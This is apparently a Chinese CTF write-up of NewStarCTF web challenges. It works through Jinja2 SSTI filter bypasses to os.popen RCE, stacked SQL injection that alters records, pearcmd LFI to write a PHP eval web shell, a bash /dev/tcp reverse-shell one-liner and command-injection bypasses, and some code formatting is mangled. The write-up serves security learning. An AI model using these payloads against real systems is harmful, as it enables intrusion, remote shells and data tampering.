<h2 id="WEB-Week3"><a href="#WEB-Week3" class="headerlink" title="WEB-Week3"></a>WEB-Week3</h2><h3 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a>BabySSTI_One</h3><p>参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/calmegm/article/details/97390756" >Python沙箱逃逸总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/shutTD/article/details/127167935" >NewStar BabySSTI_One-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>首先需要理解 <strong>Flask</strong> 的模板注入 <strong>SSTI</strong> 的含义，Flask套用了 <strong>Jajin2</strong> 的语法，通过 <code>&#123;&#123;a&#125;&#125;</code> 解析变量内容，通过 <code>&#123;% for i in range(10) %&#125;&#123;...&#125;&#123;% endif %&#125;</code> 来构造python的控制环境。注入前可以先做测试：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; &#x27;7777777&#x27;	# 说明是存在注入的，而且是flask</span><br></pre></td></tr></table></figure></div>

<p>通过注入可以获取python的一些内容，要想干坏事就需要利用python的魔术方法去获取一些特殊的函数，进而实现RCE。</p>
<p>手动测试，发现 <code>class, mro, init, base</code> 被过滤了。</p>
<p><code>__builtins__</code> 正常回显，但 <code>dir(__builtins__)</code> 或 <code>dir()</code> 都有问题，而且都没有输出；<code>__builtins__.__import__</code> 也不行。因此 <code>__builtins__</code> 无法利用。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__</span><br><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__.__builtins__</span><br></pre></td></tr></table></figure></div>

<p>上述语句可以访问到内容，并且有输出，进一步获取：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure></div>

<p>通过内建函数的 <code>__import__</code> 调用到”os”包中的 <code>os.popen()</code> 函数，执行命令行，<code>read()</code> 将得到的结果返回。</p>
<p>此处 <code>flag, cat</code> 都遭到了过滤，<code>cat</code> 可以使用 <code>nl, head, tail</code> 等绕过，<code>flag</code> 使用 <code>f*</code> 绕过，因此payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a.__getattribute__(&#x27;__i&#x27;+&#x27;nit__&#x27;).__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>当获取了某个函数如 <code>a.__getattrbute(&#39;__i&#39;+&#39;nit__&#39;)</code> 或 <code>lipsum</code> 时，可以调用 <code>__globals__.__builtins__</code> 先获取变量空间，再获取内建函数，通过调用内建函数中的 <code>__import__</code> 可以获取到模块”os”中的命令行执行函数，从而实现RCE。</p>
<p>可行的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()%&#125;</span><br><span class="line">----------------</span><br><span class="line">&#123;&#123;a.__getattribute__(&#x27;__i&#x27;+&#x27;nit__&#x27;).__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="本地测试沙箱逃逸"><a href="#本地测试沙箱逃逸" class="headerlink" title="本地测试沙箱逃逸"></a>本地测试沙箱逃逸</h4><p>测试python沙箱逃逸的时候经常会发现，本地的环境与服务器的环境测试结果有很多不同，网上提供的逃逸payload在本地测试也常常是无效的。</p>
<p>为了更好的理解python的沙箱逃逸，决定在本地仔细地做一个测试。</p>
<ol>
<li><pre><code class="python">a.__getattribute__
-&gt; NameError: name &#39;a&#39; is not defined
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   在服务器上可以，在本地是完全不行的。lipsum也是，本地并没有这个模块，也不知道从哪出现的，更不清楚从何得知服务器上就有这个函数。</span><br><span class="line"></span><br><span class="line">2. 由于payload使用了 `__getattribute__()` 实现了绕过，尝试在本地用其他方式复现：</span><br><span class="line"></span><br><span class="line">   ```python</span><br><span class="line">   [].__getattribute__(&#x27;__cl&#x27;+&#x27;ass__&#x27;)</span><br><span class="line">   -&gt; &lt;class &#x27;list&#x27;&gt;	# 成功</span><br><span class="line">   </span><br><span class="line">   [].__getattribute__(&#x27;__cl&#x27;+&#x27;ass__&#x27;).__getattribute__(&#x27;__ba&#x27;+&#x27;se__&#x27;)</span><br><span class="line">   -&gt; TypeError: descriptor &#x27;__getattribute__&#x27; requires a &#x27;list&#x27; object but received a &#x27;str&#x27;</span><br></pre></td></tr></table></figure></div>

会看到当对某个基础类型调用 `__getattribute__` 函数时就会出现问题。
</code></pre>
</li>
<li><pre><code class="python">__builtins__.__import__(&#39;os&#39;).system(&#39;whoami&#39;)
-&gt; microwin10-2258\administrator
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">本地可以利用 `__builtins__` 直接访问到所需函数，但服务器上不行。</span><br><span class="line">通过 `__dict__` 来访问：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">__builtins__.__dict__[&#x27;__impo&#x27;+&#x27;rt__&#x27;](&#x27;os&#x27;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure></div>

本地可行，字典的字符串取键可以帮助绕过过滤词。还可以通过转码：

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;X19pbXBvcnRfXw==&quot;</span>.decode(base64)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">-&gt; AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;decode&#x27;</span></span><br></pre></td></tr></table></figure></div>

在本地函数 `decode` 并不适用于base64这类编码的，要使用base64编码解码需要用到特定的模块：

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="built_in">str</span>(base64.b64decode(<span class="string">&quot;X19pbXBvcnRfXw==&quot;</span>), <span class="string">&quot;utf-8&quot;</span>)]</span><br><span class="line"></span><br><span class="line">-&gt; &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></table></figure></div>
</code></pre>
</li>
</ol>
<p><strong>Tips：</strong></p>
<ul>
<li><p><code>__mro__</code> 和 <code>mro()</code> 效果一样；<code>type(obj)</code> 和 <code>obj.__class__</code> 效果一样。</p>
</li>
<li><p><code>dir()</code> 返回当前范围内的变量、方法和定义的类型列表；带参数时返回参数的属性、方法列表。如果参数包含方法 <code>__dir__()</code> 则调用该方法。</p>
</li>
<li><p><code>__builtins__</code> 表示内建函数，可以是环境中的，亦或是某个特定函数的，它可以调取很广范围内的函数。</p>
</li>
<li><p>利用 <code>&lt;class &#39;list&#39;&gt;.__name__ == &quot;list&quot;</code> 可以获取类型描述的类型名称</p>
</li>
<li><p><code>__globals__: 对保存函数全局变量的字典的引用，即定义函数的模块的全局命名空间</code> 获取一系列变量</p>
</li>
<li><p><code>str(bytes, &quot;utf-8&quot;)</code> 可以将utf-8编码的byte类型的数据转换为相同的字符串。</p>
</li>
<li><pre><code class="python">import base64
base64.b64encode(&#39;__import__&#39;.encode(&#39;utf-8&#39;))
# =&gt; b&#39;X19pbXBvcnRfXw==&#39;
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  因为python3.x中字符都为unicode编码，而b64encode函数的参数为byte类型，所以必须先转码</span><br><span class="line"></span><br><span class="line">#### 词本</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
implement: vt. 实施，执行
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### multiSQL</span><br><span class="line"></span><br><span class="line">#### 解题及测试</span><br><span class="line"></span><br><span class="line">* 过滤了双引号，注释符 `#, --%20`，但单引号可以注入</span><br><span class="line"></span><br><span class="line">* 过滤了 `select, union`</span><br><span class="line"></span><br><span class="line">* 查看提示，这里可以堆叠注入。前端页面能回显输入框的内容不代表输入的内容全都被当做字符串处理了。</span><br><span class="line"></span><br><span class="line">  ```sql</span><br><span class="line">  1&#x27;; show databases;</span><br><span class="line">  -&gt;</span><br><span class="line">  english			</span><br><span class="line">  information_schema			</span><br><span class="line">  mysql			</span><br><span class="line">  performance_schema	</span><br></pre></td></tr></table></figure></div>

经过测试，查询语句后多出一个引号不会影响前面的查询结果正常输出，这里查询到数据库名称，猜得出来表名是&quot;english&quot;（英语四级嘛）。
</code></pre>
</li>
<li><p>比较：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure></div>

<p>第一个payload有回显字段名，第二个payload没有响应，能说明只有四个字段（其实也看得出来）。真正的意义在于去掉分号肯定没有回显。因此在后置一个引号的情况下，前面一定需要一个分号来提前结束语句，从而使得前面查询的结果正确输出。<br>前面测试引号的时候，单引号注入也会导致界面没有响应。</p>
</li>
<li><p><code>show tables;</code> 会返回当前数据库的所有表，查询得到：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">score</span><br></pre></td></tr></table></figure></div>

<p>所以是”english”库中的”score”表，查看表结构：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; desc score;</span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">username	varchar(255)	YES	</span></span><br><span class="line"><span class="string">listen	int(11)	YES	</span></span><br><span class="line"><span class="string">read	int(11)	YES	</span></span><br><span class="line"><span class="string">write	int(11)	YES</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>提示中显示用”update”来获取flag，显然是因为 <code>insert</code> 被过滤了（<code>create</code> 倒是能用，但是考虑到不能自己select表，因此没什么用，<code>delete</code> 也活着）。因此我们需要尝试更新表”score”，将flag插入其中，利用原有的查询查到flag。</p>
</li>
<li><p>首先update需要更改已有的记录，根据题目描述，亲爱的火华师傅应该是有记录的：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">火华</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">姓名	听力	阅读	写作</span><br><span class="line">火华	<span class="number">11</span>	<span class="number">201</span>	<span class="number">212</span></span><br></pre></td></tr></table></figure></div>

<p>因此得到 <code>username=火华</code> . 然后就没思路了</p>
</li>
<li><p>看了<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/shutTD/article/details/127157978" >别人的wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>发现：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1# </span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">姓名	听力	阅读	写作</span></span><br><span class="line"><span class="string">火华	11	201	212</span></span><br></pre></td></tr></table></figure></div>

<p>所以这个库里其实就这一条记录（注释符是有用的啊）</p>
<p><code>update</code> 其实被过滤了！完全没有尝试过啊，真没发现&#x3D; &#x3D;</p>
</li>
<li><p>使用 <code>replace into table_name values(fd1, fd2, fd3, fd4)</code> 语句来更新表中的内容：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; replace into score values(&quot;火华&quot;, 200, 200, 200);</span></span><br></pre></td></tr></table></figure></div>

<p>然后再次查询火华，发现有两个：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">姓名	听力	阅读	写作</span><br><span class="line">火华	<span class="number">11</span>	<span class="number">201</span>	<span class="number">212</span></span><br><span class="line">火华	<span class="number">200</span>	<span class="number">200</span>	<span class="number">200</span></span><br></pre></td></tr></table></figure></div>

<p>尝试读取第二个，再验证：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">火华<span class="string">&#x27; limit 1,1;</span></span><br></pre></td></tr></table></figure></div>

<p>发现不行！需要删除低分的记录才能通过验证：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; delete from score where listen=11;</span></span><br></pre></td></tr></table></figure></div>

<p>然后再次验证，得到flag：<code>flag&#123;Ju3t_use_mo2e_t2en_0ne_SQL&#125;</code> </p>
</li>
<li><p>发现了神奇的问题，删除记录的时候，只有 <code>username, listen</code> 两个字段是有效的，<code>write, read</code> 完全没用！在本地sql上测试发现使用这两个字段名会报错；猜测是因为他俩本身是保留字，新建另一张表，字段名对应改为 <code>readn, writen</code> ，发现可以使用这两个字段进行删除操作！说明保留字的猜测是正确的。</p>
</li>
<li><p>看了wp才意识到自己忘了题目，题目上写着希望帮火华师傅改成绩通过学校验证，因此拿到flag的方式就是修改记录；而自己的思路主要是寻找数据库中的flag并放入可以查询的数据表中，或是通过改写服务器上的php文件来写入木马，从而得到后门，找到存在服务器中的flag。</p>
</li>
</ul>
<h3 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h3><p>LFI代表php本地文件 包含漏洞，RCE代表远程代码执行漏洞。</p>
<p>因此 <code>RCE via LFI</code> 表示依赖LFI实现的RCE</p>
<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/50445145" >PHP本地文件包含漏洞笔记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1395/" >The End Of LFI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://gitbook-88.gitbook.io/ctf-writeup/2022/2022-newstarctf/week3-includetwo" >[WEEK3]IncludeTwo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><ul>
<li><pre><code>file=index
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">会产生递归调用的效果，不断出现新的index代码，当加上空字符就无效：</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
file=index%00
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">猜测可以实现00截断，PHP版本低于5.3.4，但是尝试了</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
?file=index.php%00
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  发现并没有读取到&quot;index.php&quot;，因此还是不能做到截断的。</span><br><span class="line">  </span><br><span class="line">* 翻了好久的&quot;LFI via RCE&quot;，在P佬的 [Docker PHP裸文件本地包含综述](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) 中找到了可行的思路，利用Dcoker中自动安装的&quot;/usr/local/lib/pearcmd.php&quot;文件与Docker环境下自动开启的&quot;register_argc_argv&quot;配置，用请求传入CLI，访问PHP扩展管理工具&quot;pecl&quot;来实现任意文件写。</span><br><span class="line"></span><br><span class="line">  pecl中有一个命令是 `config-create contents filePath` ，它可以在权限范围内将&quot;contents&quot;写入指定路径的文件中。</span><br><span class="line"></span><br><span class="line">  能成功写入文件的payload：</span><br><span class="line"></span><br><span class="line">  ```php</span><br><span class="line">  ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

写入成功后CLI的回显也会相应打回前端。接着访问&quot;/tmp/hello.php&quot;：

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/hello</span><br><span class="line"></span><br><span class="line">-&gt;<span class="comment">#PEAR_Config 0.9 a:12:&#123;s:7:&quot;php_dir&quot;;s:62:&quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/php&quot;;s:8:&quot;data_dir&quot;;s:63:&quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?...</span></span><br></pre></td></tr></table></figure></div>

会发现 `phpinfo()` 并没有成功执行。一开始没意识到是为什么，查询了wp后发现是因为发送HTTP请求时，尖括号进行了URL编码。由于argv将直接读取传入的内容作为CLI参数，因此被URL编码的尖括号并未被URL解码就作为参数传给了pecl工具，于是写入文件的就从 `&lt;?=phpinfo()?&gt;` 变成了 `%3C?=phpinfo()?%3E` ，因此php命令就失效了，这个在访问hello.php时其实可以看得出来（虽然没意识到是这么一回事）。由于在发送HTTP请求时，不论是什么shell都会进行URL编码，因此切换工具是不行的（包括但不限于Python的request库，浏览器，hackbar，curl），只能用burp抓取已经发送的包进行修改，还原被URL编码的字符再发送才能成功。

最后getshell的payload：

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=@eval($_GET[%27shell%27])?%3E+/tmp/shell.php</span><br><span class="line"></span><br><span class="line">?file=/tmp/shell&amp;shell=system(&#x27;cat /f*&#x27;);</span><br><span class="line"></span><br><span class="line">-&gt;flag&#123;8438c22d-d66c-4fc3-848e-4677ac90d5d7&#125;</span><br></pre></td></tr></table></figure></div>

 使用burp的&quot;url-decode&quot;时，原本的&quot;+&quot;会被解码成某种空白字符，它会导致请求400；太久没写php了，忘记执行函数要套上 `system()` ，还捣鼓了半天（=\_=），这里也可以反弹shell：`?file=/tmp/shell&amp;shell=system(&#39;bash -c &quot;bash -i &gt;%26 /dev/tcp/ip/port 0&gt;&amp;261&quot;&#39;);` 。受到之前url编码的影响，我以为反弹shell的时候也要避开url编码，却发现这样的话 `&amp;` 符号就不知如何处理，但实际上这个参数由php接收，它是会被url解码的，因此不需要考虑特殊字符的问题，同时 `$_GET` 与 `$_POST` 也都是可以的。 

对于 `&amp;` 字符，它除了被URL编码之外，都将被识别为不同参数的分界符，这是由URL的语法分析原则决定的。
</code></pre>
</li>
<li><p>关于P神的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+&amp;file=/usr/local/lib/php/pearcmd+&amp;/&lt;?=phpinfo();?&gt;+/tmp/pinfo.php</span><br><span class="line"></span><br><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

<p>上方的payload不能成功写入文件，这是我一开始写的，下方的是P神的payload，因此我突然发现P神的payload很有意思。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RFC3875中规定，如果query-string中不包含没有编码的=，且请求是GET或HEAD，则query-string需要被作为命令行参数。</span><br><span class="line">PHP中即使我们传入的query-string包含等号，也仍会被赋值给$_SERVER[&#x27;argv&#x27;]</span><br></pre></td></tr></table></figure></div>

<p>传入的请求参数若不赋予其值，则会被当做命令行参数处理，前提是开启了 <code>register_argc_argv</code> 选项。因此实际执行的命令是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+config-create+/file/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

<p><code>+</code> 代替空格。相当于往 <code>/tmp/hello.php</code> 文件中写入了  <code>/file/&lt;?=phpinfo()?&gt;</code> 内容。其中 <code>&lt;?=</code> 是标签 <code>&lt;?php echo</code> 的简写，即写入了 <code>&lt;?php echo phpinfo()?&gt;</code> ，可以没有分号，语句也能正常执行。</p>
<hr>
<p>开头的空格</p>
<p>开一个Docker的PHP环境来测试：</p>
</li>
</ul>
<h3 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">17</span>:<span class="string">&quot;first\second\user&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;456&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>php调用父类构造方法：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br></pre></td></tr></table></figure></div>

<p>网上找的EXP跑不了，直接看了WP，发现人家的EXP也是来自网上</p>
<p>有用的：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/127152796" >WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>， <a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263977.html" >EXP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>实际上该EXP本身就需要请求参数来作为RCE的参数。调用链条的最后来到Request.php中的 <code>param</code> 函数，此处调用了 <code>input()</code> 函数，并选取 <code>$this-&gt;param</code> 作为最终回调函数的参数，也就是说任意Request类的该参数是RCE的参数。该参数实际上是请求中以GET方式传入的首个任意内容，如：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=id</span><br><span class="line">?id=ls</span><br><span class="line">?k=pwd&amp;ac=ls	// 执行pwd</span><br></pre></td></tr></table></figure></div>

<p>但 <code>?=id</code> 不行</p>
<h4 id="PHP函数："><a href="#PHP函数：" class="headerlink" title="PHP函数："></a>PHP函数：</h4><p><code>explode(&quot; &quot;, &quot;a b cd e&quot;)</code> ：Break a string into an array &#x3D;&gt; <code>[a, b, cd, e]</code></p>
<hr>
<p>最终flag在环境变量中：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line">=&gt; flag&#123;3de1b876-591e-46bf-b4b7-b239a6995f05&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="WEB-Week4"><a href="#WEB-Week4" class="headerlink" title="WEB-Week4"></a>WEB-Week4</h2><h3 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h3><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41315957/article/details/118855865" >RCE姿势 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h4><p><code>et</code> ：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/yhj_911/article/details/125302051" >Linux下打开WPS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>base</code> ：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/JasonCeng/p/15741335.html" >base64 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26ls</span><br><span class="line"></span><br><span class="line">=&gt;bin boot dev etc ffffllllaaaaggggg home lib lib64 media mnt opt proc root run sbin srv start.<span class="property">sh</span> sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure></div>

